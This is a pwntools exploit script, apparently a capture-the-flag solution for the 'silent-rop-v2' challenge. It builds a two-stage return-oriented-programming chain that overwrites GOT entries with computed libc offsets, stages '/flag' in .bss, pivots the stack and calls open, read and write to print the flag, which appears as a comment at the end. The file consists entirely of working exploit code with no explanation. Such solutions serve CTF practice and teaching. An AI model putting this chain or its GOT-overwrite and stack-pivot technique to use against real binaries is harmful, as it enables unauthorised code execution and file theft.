#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chal_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

DOCKER_PORT = 1337
REMOTE_NC_CMD    = "nc silent-rop-v2.challs.csc.tf 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *0x00000000004011d7
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    #0x00000000004011e9: mov rdi, qword ptr [rdx]; ret; 
    #0x00000000004011f6: add rdi, rdx; ret; 
    #0x00000000004011ed: mov qword ptr [rdx + rsi], rdi; ret; 


    rop = ROP(exe)

    rop.raw(cyclic(24))
    rop.rdx = exe.got.read
    rop.raw(0x00000000004011e9)
    rop.rdx = 2**64 - (libc.sym.read - libc.sym.open)
    rop.raw(0x00000000004011f6)
    rop.rsi = 0
    rop.rdx = exe.bss(0x100)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = u64(b"/flag\0\0\0") 
    rop.rdx = exe.bss(0x200)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = 0x0000000000401293 
    rop.rdx = exe.bss(0x108)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = 1
    rop.rdx = exe.bss(0x110)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = 0x00000000004011e2 
    rop.rdx = exe.bss(0x118)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = 0x100
    rop.rdx = exe.bss(0x120)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = 0x0000000000401291 
    rop.rdx = exe.bss(0x128)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = exe.bss(0x200)
    rop.rdx = exe.bss(0x130)
    rop.raw(0x00000000004011ed)
    rop.raw(exe.sym.main)

    r.sendline(rop.chain())

    rop = ROP(exe)

    rop.raw(cyclic(24))

    rop.rdi = exe.bss(0x200)
    rop.rdx = exe.bss(0x138)
    rop.rsi = 0
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = exe.plt.read
    rop.rdx = exe.bss(0x140)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = 0x0000000000401293 
    rop.rdx = exe.bss(0x148)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = 2
    rop.rdx = exe.bss(0x150)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = 0x00000000004011e2 
    rop.rdx = exe.bss(0x158)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = 0x100
    rop.rdx = exe.bss(0x160)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = 0x0000000000401291 
    rop.rdx = exe.bss(0x168)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = exe.bss(0x200)
    rop.rdx = exe.bss(0x170)
    rop.raw(0x00000000004011ed)

    rop.rsi = 0
    rop.rdi = exe.bss(0x200)
    rop.rdx = exe.bss(0x178)
    rop.raw(0x00000000004011ed)

    rop.rsi=0
    rop.rdx = exe.got.read
    rop.raw(0x00000000004011e9)
    rop.rdx = libc.sym.write - libc.sym.read
    rop.raw(0x00000000004011f6)
    rop.rsi = 0
    rop.rdx = exe.bss(0x180)
    rop.raw(0x00000000004011ed)

    rop.rdi = exe.bss(0x200)
    rop.rsi = 0
    rop.rdx = 0


    rop.rbp = exe.bss(0xf8)
    rop.raw(0x00000000004011d7) #leave

    log.info(hex(len(rop.chain())))
    r.sendline(rop.chain())

    r.interactive()
    #CSCTF{Full_R3lR0_c4Nt_st0p_uS_Fr0m_DL_r3S0lv1nG_h9348fj3984fj439fij34i34jf93fj034ff}

if __name__ == "__main__":
    main()